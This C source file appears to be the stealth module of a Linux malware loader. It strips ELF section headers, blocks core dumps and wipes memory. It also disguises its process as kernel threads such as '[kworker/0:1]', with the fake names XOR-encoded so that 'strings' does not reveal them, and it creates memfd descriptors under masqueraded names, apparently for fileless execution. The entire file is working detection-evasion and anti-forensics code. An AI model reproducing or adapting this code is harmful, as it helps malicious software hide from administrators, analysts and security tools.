#include "common.h"
#include "elf64.h"
#include <unistd.h>

void strip_elf_metadata(uint8_t* data, size_t len) {
    if (!data || len < sizeof(Elf64_Ehdr)) return;
    if (!is_elf64(data)) return;

    Elf64_Ehdr* ehdr = (Elf64_Ehdr*)data;
    ehdr->e_shoff     = 0;
    ehdr->e_shnum     = 0;
    ehdr->e_shentsize = 0;
    ehdr->e_shstrndx  = 0;

    for (int i = 7; i < EI_NIDENT; i++) {
        ehdr->e_ident[i] = 0;
    }
}

void deobf_str_xor(char* dst, const uint8_t* src, size_t len, uint8_t key) {
    for (size_t i = 0; i < len; i++) {
        dst[i] = (char)(src[i] ^ key);
    }
}

void secure_memory_wipe(void* ptr, size_t size) {
    if (!ptr || size == 0) return;

    volatile uint8_t* mem = (volatile uint8_t*)ptr;

    // Use secure random if available, fallback to rand
    static int rand_initialized = 0;
    if (!rand_initialized) {
        srand(time(NULL) ^ getpid());
        rand_initialized = 1;
    }

    for (int pass = 0; pass < 3; pass++) {
        for (size_t i = 0; i < size; i++) {
            switch (pass) {
                case 0: mem[i] = 0x00; break;      // Zeros
                case 1: mem[i] = 0xFF; break;      // Ones
                case 2: mem[i] = (uint8_t)rand(); break;  // Random
            }
        }
    }

    // Prevent optimization
    __asm__ __volatile__("" : : "r"(mem) : "memory");
}

void prevent_core_dumps(void) {
    struct rlimit rl;
    rl.rlim_cur = 0;
    rl.rlim_max = 0;
    // The below might fail, but the execution won't be impacted
    setrlimit(RLIMIT_CORE, &rl);
}

void hide_process_title(int argc, char* argv[]) {
    if (argc > 0 && argv && argv[0]) {

        size_t orig_len = strlen(argv[0]);
        memset(argv[0], 0, orig_len);

        const char* innocent_name = get_random_innocent_name();
        size_t copy_len = strlen(innocent_name);
        if (copy_len >= orig_len) {
            copy_len = orig_len - 1;
        }
        memcpy(argv[0], innocent_name, copy_len);
        argv[0][copy_len] = '\0';

        prctl(PR_SET_NAME, innocent_name, 0, 0, 0);
    }
}

/*
 * Innocent process names, XOR-encoded with key 0x5A so the plaintext
 * (kernel-thread names like "[kworker/0:1]") never appears in `strings`
 * output of the loader binary. Decoded on demand into a static buffer.
 */
#define INNOCENT_XOR_KEY 0x5A

static const uint8_t innocent_obf_kworker[]   = {0x01, 0x31, 0x2D, 0x35, 0x28, 0x31, 0x3F, 0x28, 0x75, 0x6A, 0x60, 0x6B, 0x07};
static const uint8_t innocent_obf_ksoftirqd[] = {0x01, 0x31, 0x29, 0x35, 0x3C, 0x2E, 0x33, 0x28, 0x2B, 0x3E, 0x75, 0x6A, 0x07};
static const uint8_t innocent_obf_migration[] = {0x01, 0x37, 0x33, 0x3D, 0x28, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x75, 0x6A, 0x07};
static const uint8_t innocent_obf_rcugp[]     = {0x01, 0x28, 0x39, 0x2F, 0x05, 0x3D, 0x2A, 0x07};
static const uint8_t innocent_obf_watchdog[]  = {0x01, 0x2D, 0x3B, 0x2E, 0x39, 0x32, 0x3E, 0x35, 0x3D, 0x75, 0x6A, 0x07};
static const uint8_t innocent_obf_kcompactd[] = {0x01, 0x31, 0x39, 0x35, 0x37, 0x2A, 0x3B, 0x39, 0x2E, 0x3E, 0x6A, 0x07};
static const uint8_t innocent_obf_kswapd[]    = {0x01, 0x31, 0x29, 0x2D, 0x3B, 0x2A, 0x3E, 0x6A, 0x07};
static const uint8_t innocent_obf_journal[]   = {0x01, 0x29, 0x23, 0x29, 0x2E, 0x3F, 0x37, 0x3E, 0x77, 0x30, 0x35, 0x2F, 0x28, 0x34, 0x3B, 0x36, 0x07};

static const struct {
    const uint8_t* obf;
    size_t len;
} innocent_obf_table[] = {
    { innocent_obf_kworker,   sizeof(innocent_obf_kworker)   },
    { innocent_obf_ksoftirqd, sizeof(innocent_obf_ksoftirqd) },
    { innocent_obf_migration, sizeof(innocent_obf_migration) },
    { innocent_obf_rcugp,     sizeof(innocent_obf_rcugp)     },
    { innocent_obf_watchdog,  sizeof(innocent_obf_watchdog)  },
    { innocent_obf_kcompactd, sizeof(innocent_obf_kcompactd) },
    { innocent_obf_kswapd,    sizeof(innocent_obf_kswapd)    },
    { innocent_obf_journal,   sizeof(innocent_obf_journal)   },
};

const char* get_random_innocent_name(void) {
    static char decoded[32];
    static int initialized = 0;
    if (!initialized) {
        srand(time(NULL));
        initialized = 1;
    }

    size_t count = sizeof(innocent_obf_table) / sizeof(innocent_obf_table[0]);
    int index = rand() % count;
    size_t len = innocent_obf_table[index].len;
    if (len >= sizeof(decoded)) len = sizeof(decoded) - 1;

    deobf_str_xor(decoded, innocent_obf_table[index].obf, len, INNOCENT_XOR_KEY);
    decoded[len] = '\0';
    return decoded;
}

int create_masqueraded_memfd(void) {
    const char* innocent_name = get_random_innocent_name();
    return syscall2(__NR_memfd_create, (long)innocent_name, 0);
}